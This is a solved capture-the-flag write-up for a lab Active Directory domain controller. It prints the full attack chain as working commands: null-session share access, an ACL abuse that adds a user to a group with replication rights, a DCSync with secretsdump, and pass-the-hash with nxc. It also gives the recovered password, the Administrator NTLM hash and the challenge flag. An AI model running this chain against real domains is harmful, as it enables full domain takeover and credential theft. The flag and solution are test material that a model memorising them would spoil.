# Legacy IT (AD) — SOLVED — author

Target: DC01 / easyad.local, 10.83.11.236 (live instance)
Our VPN IP: 10.82.0.63 (dev pp2026-vpn)

FLAG (Administrator's Desktop):
PP{l3g4cy-1t-4dm1ns-4k4-w1nd0ws-4dm1ns::mRbRuGCSEzE-}
(exact bytes verified: 53 bytes, trailing '-' inside braces is real)

## Kill chain (no relay, no coercion needed)

1. Null session (SMB signing disabled, null auth allowed) -> `Public` share is world-READ
 and contains `onboarding.txt`:
 Domain: easyad.local Username: trainee Password: Welcome-To-IT-2026!
2. Recon as trainee: LDAP signing Enforced (use LDAPS), SMBv1 off, ms-DS-MachineAccountQuota=0,
 functional level 2025, no lockout threshold. No kerberoastable / AS-REP accounts.
3. RID brute (SAMR) -> extra group RID 1104 "Legacy IT Admins"
 ("Compatibility group for retired administration tooling").
4. ACL read (dacledit -use-ldaps) -> trainee has FullControl (0xf01ff) on CN=Legacy IT Admins.
 BloodHound JSON -> that group holds *GetChanges + GetChangesAll on the domain* = DCSync.
 trainee --GenericAll--> "Legacy IT Admins" --GetChanges/All--> DOMAIN
5. Added trainee to the group over LDAPS (ldap3, NTLM `EASYAD\trainee`), fresh bind to verify.
6. DCSync:
 secretsdump.py easyad.local/trainee:'Welcome-To-IT-2026!'@10.83.11.236 -just-dc-user Administrator
 -> Administrator:500:aad3b435b51404eeaad3b435b51404ee:4e0a4dc9096058a1046f972164bac991
7. PTH + read C$:
 nxc smb 10.83.11.236 -u Administrator -H 4e0a4dc9096058a1046f972164bac991 -d easyad.local \
 --share C$ --get-file 'Users\Administrator\Desktop\flag.txt' flag.txt

## Notes / negative results
- secretsdump as trainee BEFORE joining the group: DRSR SessionError 0x20f7
 (ERROR_DS_DRA_BAD_DN) — that is impacket's misleading symptom of *insufficient
 replication rights*, not a wrong DN.
- Nothing to relay: LDAP signing enforced; no coercion was ever attempted. The whole
 box falls to the ACL -> DCSync chain above.
- Artifacts: work/onboarding.txt, work/bh/*, work/add_member.py,
 work/flag.txt
